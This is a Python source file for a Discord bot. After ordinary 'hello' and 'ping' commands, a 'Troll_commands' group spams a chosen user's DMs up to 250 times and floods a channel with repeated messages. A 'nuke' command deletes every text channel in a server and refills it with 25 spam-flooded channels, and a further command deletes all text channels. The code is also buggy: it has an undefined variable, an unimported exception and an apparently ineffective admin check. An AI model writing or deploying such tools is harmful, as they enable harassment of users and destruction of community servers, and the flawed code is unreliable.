import asyncio
from typing import Optional

import discord
from discord import Forbidden
from discord import app_commands
from discord.ext import commands



class Simple_commands(commands.Cog):
    def __init__(self, client):
      self.client = client
       
    @app_commands.command(name='hello')
    async def hello(self,interaction: discord.Interaction):
      await interaction.response.send_message(content=f"Hello!  {interaction.user.mention}!")
      
    @app_commands.command(name='ping', description='Pong!')
    async def ping(self,interaction: discord.Interaction):
      try:
        # Assuming you are using discord.Client
        latency = round(self.client.latency * 1000, 2)
        await interaction.response.send_message(content=f"Pong! Responded in {latency}ms!")
      except Exception as e:
        print(e)




      
class Troll_commands(commands.Cog):
  def __init__(self, client):
    self.client = client

  @app_commands.command(name="send_dm")
  @app_commands.describe(amount= "The amount of messages to send", username='member to spam dm', send_message="What do you want to send to this user?")
  async def spam_dm(self, interaction: discord.Interaction, amount: Optional[int], username: discord.User, send_message: str):
    try:
      if amount is None:
          amount = 1
          try:
              dm_channel = await username.create_dm()
          except Forbidden:
              await interaction.response.send_message(content="I don't have permission to send DMs to that user")
              return
      elif amount > 250:
          await interaction.response.send_message(content=f"{interaction.user.mention} :warning: Amount must be less than 250 :warning:")
          return

      await interaction.response.send_message(content=f"Spamming {username} {amount} times!")

      # Send messages in the existing DM channel
      for i in range(amount):
          await dm_channel.send(f"{send_message} {username.mention}")
          await asyncio.sleep(0.6)

      await interaction.edit_original_response(content=f"Sent {amount} DMs to {username} ({interaction.user.mention})")

    except Forbidden:
      await interaction.edit_original_response(content=f"{interaction.user.mention} I can't spam {username} {amount} times")
    except discord.app_commands.errors.CommandInvokeError:
      await interaction.response.send_message(content=f"{interaction.user.mention} You are being rate-limited since you're breaking the bot!")
    except HTTPException:
      print("hi")

  @app_commands.command(name="send_channel")
  @app_commands.describe(amount= "The amount of messages to send",send_message="What do you want to send to this channel?", channel='channel to send the message in')
  async def send(self, interaction: discord.Interaction, amount: Optional[int], send_message: str, channel: discord.TextChannel):
    try:
      if amount is None:
        await interaction.response.send_message(content="sent")
        await channel.send(send_message)
      if amount is not None and amount > 250:
        await interaction.response.send_message(content=f"{interaction.user.mention} :warning: Amount must be less than 250 :warning:")
      await interaction.response.send_message(content=f"Sending {amount} messages to {channel}!")
      for i in range(amount):
        await channel.send(send_message)
        await asyncio.sleep(0.6)
    except Exception as e:
      print(e)
      
  @app_commands.command(name="nuke", description= "nukes a server")
  @commands.has_permissions(administrator=True)
  @app_commands.describe(channel_message='message to send in new channels')
  async def nuke(self,interaction: discord.Interaction, channel_names: str, channel_message: str): 
    try:
      server = interaction.guild
      text_channels = [channel for channel in server.channels if isinstance(channel, discord.TextChannel)]
      for channel in text_channels:
          await channel.delete()
      for i in range(25):
        new_channel = await server.create_text_channel(channel_names)
        for j in range(20):
          await new_channel.send(channel_message)
          await asyncio.sleep(0.5)
    except Forbidden:
      await interaction.response.send_message("I don't have permission to delete that channel")
  @app_commands.command(name='delete_channels')
  @commands.has_permissions(administrator=True)
  async def delete_channels(self, interaction: discord.Interaction):
      server = interaction.guild
      # Get a list of all text channels in the guild
      text_channels = [channel for channel in server.channels if isinstance(channel, discord.TextChannel)]
      for channel in text_channels:
          await channel.delete()
      await server.create_text_channel("general")

